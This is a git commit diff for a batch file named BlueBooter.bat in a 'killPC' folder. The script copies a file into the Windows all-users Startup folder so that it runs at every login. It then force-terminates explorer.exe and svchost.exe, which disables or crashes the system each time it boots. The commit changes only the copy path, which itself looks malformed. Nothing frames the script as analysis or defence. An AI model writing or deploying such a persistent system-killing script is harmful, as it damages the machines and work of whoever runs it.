ba3cb9b50853ff18f0cd33a6405a336a9e3212fd
hi1587 <darboy16651@gmail.com>
2025-02-12 21:39:02 +0100

    Update BlueBooter.bat

--- src/killPC/BlueBooter.bat
+++ src/killPC/BlueBooter.bat
@@ -1,3 +1,3 @@
-copy "C:\Users\%USERPROFILE%\Desktop\idk\BueBooter" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+copy "C:\Users\%USERPROFILE%\Desktop\idk\src\killPC\BueBooter" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 taskkill /f /im explorer.exe
 taskkill /f /im svchost.exe
